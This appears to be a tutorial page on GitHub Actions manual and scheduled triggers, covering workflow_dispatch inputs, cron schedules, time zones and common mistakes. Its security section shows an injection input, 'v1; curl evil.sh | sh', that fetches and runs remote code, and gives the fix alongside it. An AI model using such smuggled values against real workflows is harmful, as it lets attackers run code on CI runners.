Actions: Manual & Scheduled Triggers

workflow_dispatch · inputs · schedule: cron · timezone

Run It by Hand or on a Clock

workflow_dispatch adds a Run workflow button to the Actions tab (and enables gh workflow run and the REST API), with up to 25 typed inputs. schedule runs on a cron expression; times are UTC unless you add a timezone: key with an IANA name. Scheduled runs use the workflow file on the default branch only.

Scheduling Facts

  • Shortest interval is 5 minutes; runs can start late during busy periods, especially at the top of the hour: pick an odd minute
  • In public repos, schedules are disabled after 60 days with no repo activity
  • The dispatch button only appears once the workflow file is on the default branch
  • Read inputs with inputs.name (typed) — also on github.event.inputs (always strings)

Inputs and a Schedule

on:
  workflow_dispatch:
    inputs:
      environment:
        type: choice
        options: [staging, production]
        default: staging
      dry-run: { type: boolean, default: true }
      version:
        required: true
        type: string
  schedule:
    - cron: "17 6 * * 1-5"        # 06:17 Mon–Fri
      timezone: "America/Chicago" # omit = UTC
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - env: { VERSION: "${{ inputs.version }}" }   # safe: via env
        run: echo "Deploying $VERSION"
      - if: ${{ !inputs.dry-run }}
        run: ./deploy.sh

Code Explained

type: — string, boolean, choice, number, environment
required: true — UI and API refuse to start without it
cron: — minute hour day month weekday
timezone: — IANA name; handles daylight saving
inputs.* — empty on scheduled runs; set defaults with ||
gh workflow run deploy.yml -f version=v1.4.0 — start from the CLI

Security Check

  • Risk: dispatch inputs are typed by whoever runs the workflow. Pasting ${{ inputs.version }} straight into run: lets v1; curl evil.sh | sh execute.
  • Fix: pass inputs through env: and quote them ("$VERSION"), and validate format (e.g. [[ $VERSION =~ ^v[0-9.]+$ ]]).

⚠ Common Mistakes

  • Comparing github.event.inputs.dry-run == true: that context holds the string 'true'; use inputs.dry-run
  • Editing the cron on a feature branch and waiting: only the default branch's file counts
  • Forgetting UTC: 0 9 * * * without timezone: is 3–4 AM in Chicago

✓ Tips & Best Practices

  • Add workflow_dispatch: to every scheduled workflow so you can test it on demand
  • gh workflow run ci.yml --ref my-branch dispatches against a branch (the file must exist there)
  • Use crontab.guru to sanity-check expressions

Quick Summary

  • workflow_dispatch — button/CLI/API, up to 25 inputs
  • inputs.name — typed input values
  • schedule: - cron: — UTC unless timezone:
  • default branch only — for schedules
